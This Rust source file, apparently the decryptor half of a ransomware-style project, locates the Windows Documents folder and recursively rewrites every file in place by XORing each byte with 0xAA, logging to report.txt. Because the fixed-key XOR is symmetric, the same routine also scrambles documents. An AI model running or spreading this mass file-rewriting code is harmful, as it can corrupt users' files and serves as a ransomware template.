use std::io;

#[cfg(target_os = "windows")]
use std::fs::{self, File};
#[cfg(target_os = "windows")]
use std::io::{Read, Write};
#[cfg(target_os = "windows")]
use std::path::{Path, PathBuf};
#[cfg(target_os = "windows")]
use winapi::um::shlobj::{SHGetFolderPathW, CSIDL_PERSONAL};

#[cfg(target_os = "windows")]
pub fn decrypt_documents_cli() {
    let mut log_file = match open_log_file() {
        Ok(file) => file,
        Err(e) => {
            eprintln!("Failed to open the log file: {}", e);
            return;
        }
    };

    if let Err(e) = decrypt_documents(&mut log_file) {
        log_error(&mut log_file, &format!("Error: {}", e));
        eprintln!("Error: {}", e);
    } else {
        log_error(&mut log_file, "Decryption completed.");
        println!("[+] Decryption completed. Check 'report.txt' for details.");
    }
}

#[cfg(not(target_os = "windows"))]
pub fn decrypt_documents_cli() {
    println!("Decryption is only supported on Windows.");
}

#[cfg(target_os = "windows")]
fn open_log_file() -> io::Result<File> {
    File::create("report.txt")
}

#[cfg(target_os = "windows")]
fn log_error(file: &mut File, message: &str) {
    writeln!(file, "{}", message).unwrap();
}

#[cfg(target_os = "windows")]
fn decrypt_documents(log_file: &mut File) -> io::Result<()> {
    let documents_path = get_documents_folder()?;
    log_error(log_file, &format!("Found Documents folder: {}", documents_path.display()));

    decrypt_folder(&documents_path, log_file)
}

#[cfg(target_os = "windows")]
fn get_documents_folder() -> io::Result<PathBuf> {
    let mut path = [0u16; 260]; // MAX_PATH
    unsafe {
        let result = SHGetFolderPathW(
            std::ptr::null_mut(),
            CSIDL_PERSONAL,
            std::ptr::null_mut(),
            0,
            path.as_mut_ptr(),
        );
        if result == 0 {
            let path_string = String::from_utf16_lossy(&path);
            Ok(PathBuf::from(path_string.trim_matches(char::from(0))))
        } else {
            Err(io::Error::new(
                io::ErrorKind::NotFound,
                "Failed to retrieve Documents folder path",
            ))
        }
    }
}

#[cfg(target_os = "windows")]
fn decrypt_folder(path: &Path, log_file: &mut File) -> io::Result<()> {
    for entry in fs::read_dir(path)? {
        let entry = entry?;
        let entry_path = entry.path();

        if entry_path.is_dir() {
            log_error(log_file, &format!("Found folder: {}", entry_path.display()));
            decrypt_folder(&entry_path, log_file)?;
        } else {
            log_error(log_file, &format!("Decrypting file: {}", entry_path.display()));
            decrypt_file(&entry_path)?;
        }
    }
    Ok(())
}

#[cfg(target_os = "windows")]
fn decrypt_file(file_path: &Path) -> io::Result<()> {
    let mut file = File::open(file_path)?;
    let mut contents = Vec::new();
    file.read_to_end(&mut contents)?;

    // Decrypt the contents using XOR (0xAA)
    for byte in &mut contents {
        *byte ^= 0xAA;
    }

    let mut file = File::create(file_path)?;
    file.write_all(&contents)?;

    Ok(())
}
